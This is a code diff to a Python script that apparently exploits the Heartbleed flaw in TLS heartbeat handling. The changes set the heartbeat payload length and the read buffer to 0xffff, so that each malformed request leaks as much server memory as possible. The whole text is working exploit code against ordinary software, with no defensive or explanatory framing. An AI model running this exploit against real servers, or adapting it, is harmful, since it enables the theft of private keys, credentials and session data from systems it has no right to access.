@@ -49,7 +49,7 @@ def make_heartbeat(sslver):
     data = '18 ' + sslver
     data += ' 00 03'    # Length
     data += ' 01'       # Type: Request
-    data += ' 40 00'    # Payload Length (larger values do not work)
+    data += ' ff ff'    # Payload Length
     return bytearray.fromhex(data.replace('\n', ''))
 
 def hexdump(data):
@@ -129,7 +129,7 @@ class RequestHandler(socketserver.BaseRequestHandler):
     def read_memory(self, sock, timeout):
         end_time = time.time() + timeout
         buffer = bytearray()
-        wanted_bytes = 0x4000
+        wanted_bytes = 0xffff
 
         while wanted_bytes > 0 and timeout > 0:
             rl, _, _ = select.select([sock], [], [], timeout)
